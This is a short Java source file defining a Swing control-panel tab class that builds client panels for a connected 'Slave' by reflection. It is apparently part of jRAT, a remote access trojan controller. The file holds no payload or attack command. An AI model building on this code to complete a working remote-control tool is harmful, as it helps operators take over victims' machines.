package jrat.api.ui;

import jrat.controller.Slave;
import jrat.controller.ui.panels.PanelControlParent;

import javax.swing.*;
import java.lang.reflect.Constructor;

/**
 * Control panel tab view
 */
public class ControlPanelTab extends ControlPanelItem<Class<? extends ClientPanel>> {

    public ControlPanelTab(ControlPanel.Category category, String text, ImageIcon icon, Class<? extends ClientPanel> panel) {
        super(category, text, icon, panel);
    }

    public ClientPanel createPanel(Slave slave) {
        try {
            Constructor ctor = item.getDeclaredConstructor(Slave.class);
            ClientPanel instance = (ClientPanel) ctor.newInstance(slave);

            return instance;
        } catch (Exception ex) {
            ex.printStackTrace();
            return null;
        }
    }
}
